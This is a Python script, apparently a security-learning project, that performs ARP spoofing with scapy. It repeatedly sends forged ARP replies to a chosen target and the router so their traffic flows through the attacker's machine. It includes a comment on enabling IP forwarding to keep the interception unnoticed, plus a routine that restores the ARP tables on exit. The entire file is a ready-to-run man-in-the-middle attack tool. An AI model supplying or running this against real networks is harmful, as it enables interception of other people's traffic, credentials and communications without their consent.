#!/usr/bin/env python
import sys
import time
import scapy.all as scapy
import NetworkScanner as NS
import optparse
# echo 1 > /proc/sys/net/ipv4/ip_forward
# the above command needs to be executed after the execution of the program to
# maintain internet access to the spoofed device.


def get_mac(ip):
    """
    Obtaining the mac address of the device of the given ip address.
    :param ip: ip address of the device
    :return: mac address
    """
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=3, verbose=False)[0]

    return answered[0][1].hwsrc


def get_arguments():
    """
    This function asks the user for the router ip address (source) and target ip address.
    Both the ip addresses are required to be passed via the terminal
    :return: ip address of the source and target
    """
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="Target", help="Target ip address")
    parser.add_option("-s", "--source", dest="Source", help="Source ip address")
    (options, arguments) = parser.parse_args()
    if not options.Target:
        parser.error("[-] Target ip address not provided. Use --help for details.")
    if not options.Source:
        parser.error("[-] Source ip address not provided. Use --help for details.")
    return options


def spoof(target_ip, spoof_ip):
    """
    Sending an ARP request to the target device. This function is the used for spoofing the target and the router.
    :param target_ip: target ip address
    :param spoof_ip: source ip address
    :return: None
    """
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    """
    This function restores the ARP table by restoring the connections.
    :param destination_ip: destination ip address
    :param source_ip: source ip address
    :return: None
    """
    destination_mac = get_mac(destination_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=NS.scan(source_ip)[0]["mac"])
    scapy.send(packet, count=4, verbose=False)


def main():
    options = get_arguments()
    target, source = options.Target, options.Source
    packets_sent = 0
    try:
        while True:
            spoof(target, source)
            spoof(source, target)
            packets_sent += 2
            print("\r[+] Sent packets:", str(packets_sent), end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Resetting ARP tables...")
        restore(target, source)
        restore(source, target)


if __name__ == '__main__':
    main()
